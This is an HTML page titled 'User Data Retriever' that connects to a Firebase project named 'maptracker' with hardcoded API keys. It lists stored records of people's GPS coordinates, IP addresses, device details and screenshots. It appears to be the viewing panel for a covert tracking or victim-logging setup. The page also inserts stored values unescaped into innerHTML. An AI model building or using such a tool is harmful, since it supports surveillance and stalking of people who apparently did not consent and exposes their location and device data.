<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Data Retriever</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #121212;
            color: #ffffff;
            text-align: center;
            margin: 0;
            padding: 0;
        }
        h1 {
            color: #00ff00;
            margin-top: 20px;
        }
        .user-data {
            margin: 20px;
            padding: 10px;
            background-color: #1e1e1e;
            border-radius: 5px;
            text-align: left;
            display: inline-block;
            width: 90%; /* Adjusted for mobile */
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
        }
        .screenshot {
            max-width: 100%;
            border: 1px solid #00ff00;
        }
    </style>
</head>
<body>
    <h1>User Data Retriever</h1>
    <div id="data-container"></div>

    <script type="module">
        const firebaseConfig = {
            apiKey: "AIzaSyDGOfNv0d5SlEsq2LvOJZJEJSgANeswKd4",
            authDomain: "maptracker-7afb6.firebaseapp.com",
            databaseURL: "https://maptracker-7afb6-default-rtdb.firebaseio.com",
            projectId: "maptracker-7afb6",
            storageBucket: "maptracker-7afb6.appspot.com",
            messagingSenderId: "874600101063",
            appId: "1:874600101063:web:79d8010dee2bf0e57f7ae2",
            measurementId: "G-HTXZEYZ3DK"
        };

        // Initialize Firebase
        const { initializeApp } = await import("https://www.gstatic.com/firebasejs/9.14.0/firebase-app.js");
        const { getDatabase, ref, onValue } = await import("https://www.gstatic.com/firebasejs/9.14.0/firebase-database.js");

        const app = initializeApp(firebaseConfig);
        const database = getDatabase(app);
        const dataContainer = document.getElementById('data-container');

        function retrieveUserData() {
            const usersRef = ref(database, 'users');
            onValue(usersRef, (snapshot) => {
                dataContainer.innerHTML = ''; // Clear previous data
                snapshot.forEach((childSnapshot) => {
                    const userData = childSnapshot.val();
                    const userDiv = document.createElement('div');
                    userDiv.classList.add('user-data');
                    userDiv.innerHTML = `
                        <strong>Timestamp:</strong> ${new Date(userData.timestamp).toLocaleString()}<br>
                        <strong>Latitude:</strong> ${userData.latitude}<br>
                        <strong>Longitude:</strong> ${userData.longitude}<br>
                        <strong>User Agent:</strong> ${userData.userAgent}<br>
                        <strong>Device Memory:</strong> ${userData.deviceMemory} GB<br>
                        <strong>Hardware Concurrency:</strong> ${userData.hardwareConcurrency}<br>
                        <strong>Screen Resolution:</strong> ${userData.screenResolution}<br>
                        <strong>IP Address:</strong> ${userData.ipAddress}<br>
                        <strong>Language:</strong> ${userData.language}<br>
                        <strong>Platform:</strong> ${userData.platform}<br>
                        <strong>Screenshot:</strong> <img class="screenshot" src="${userData.screenshot}" alt="User Screenshot" />
                    `;
                    dataContainer.appendChild(userDiv);
                });
            });
        }

        // Call the function to retrieve user data
        retrieveUserData();
    </script>
</body>
</html>
